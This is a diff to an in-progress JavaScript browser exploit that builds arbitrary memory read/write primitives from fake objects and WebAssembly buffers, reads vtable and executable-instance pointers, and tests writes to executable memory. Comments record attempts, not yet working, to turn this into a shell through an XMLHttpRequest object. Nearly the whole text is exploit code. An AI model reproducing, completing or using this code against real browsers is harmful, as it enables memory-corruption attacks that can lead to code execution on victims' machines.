@@ -472,8 +472,6 @@
             }
             log('\t[+] Got WebAssembly buffer at 0x' + wasmBufferRawAddr.toString(16));
 
-
-
             let u = new Int64(wasmBufferRawAddr).toString()[9];
             var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr + 16, parseInt(u));
             var maxtry = 0;
@@ -546,9 +544,8 @@
                 }
             }
 
-            var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
             //a writer object which obtain various read/write module
-            var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
+            var wasmInternalBufferWriter = createObjWriter(wasmMem);
 
             function createDirectWriter(address) {
                 wasmInternalBufferWriter.write_i64(1, address);
@@ -593,7 +590,7 @@
             var writer = createObjWriter(wasmMem);
             writer.write_i64(0, Int64.One);
             var wasmBufferWriter = createObjWriter(wasmBuffer);
-            var writer = createObjWriter(wasmInternalMemory);
+            writer = createObjWriter(wasmInternalMemory);
             wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007'));
             wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
 
@@ -604,16 +601,14 @@
             writer.write_i64(0, new Int64('0x0000000000000007'));
             writer.write_i64(2, new Int64('0x0000000000000007'));
 
-            log('[*] We now have stable R/W primitives, hooray!');
+            log('[*] We now should have stable R/W primitives, hooray!');
 
             var memory = {
                 create_writer: function (addrObj) {
                     if (addrObj instanceof Int64) {
-                        var writer = createDirectWriter(addrObj);
-                        return writer;
+                        return createDirectWriter(addrObj);
                     } else {
-                        var writer = createObjWriter(addrObj);
-                        return writer;
+                        return createObjWriter(addrObj);
                     }
                 },
                 read_i64: function (addrObj, offset) {
@@ -702,6 +697,15 @@
             let exe_ptr = memory.read_i64(Add(ad_div, FPO), 0);
             log('\t[+] Executable instance is at:' + exe_ptr.toString(16));
 
+            //try whether we can write
+            //TODO:It seems that we cannot write
+            log('\t[+] Data from exe_ptr is:\n' + hexdump(memory.read(exe_ptr, 0x20), 16, 0));
+            memory.write(exe_ptr + 0x10, Add(memory.read_i64(exe_ptr, 0x10), 0x01), 0x8);
+            log('\t[+] Data from exe_ptr after add is:\n' + hexdump(memory.read(exe_ptr, 0x20), 16, 0));
+            memory.write(exe_ptr + 0x10, Sub(memory.read_i64(exe_ptr, 0x10), 0x01), 0x8);
+            log('\t[+] Data from exe_ptr now is:\n' + hexdump(memory.read(exe_ptr, 0x20), 16, 0));
+
+            /*
             let v_tlb = memory.read_i64(exe_ptr, 0);
             log('\t[+] divelement vtable seems to be at:' + v_tlb.toString(16));
 
@@ -711,11 +715,12 @@
             //TODO:What we can do with the anchor? Now we have R/W (mostly probably still in sandbox)
             //log('\t[+] Data from anchor is:\n' + hexdump(memory.read(ad_div, 0x100), 16, 0));
 
+
             //FIXME:Here is a test code with arb R/W, then try to get shell. But it do not work
             var jsxhr = new XMLHttpRequest();
             var jsxhrAddr = addrof(jsxhr);
             alert1("[+] jsxhrAddr:" + jsxhrAddr.toString(16));
-            /*
+
             //FIXME:Here the code below will cause crash of the page
             var xhrAddr = memory.read_i64(jsxhrAddr, 0x18);
             alert1("[+] xhrAddr:" + xhrAddr.toString(16));
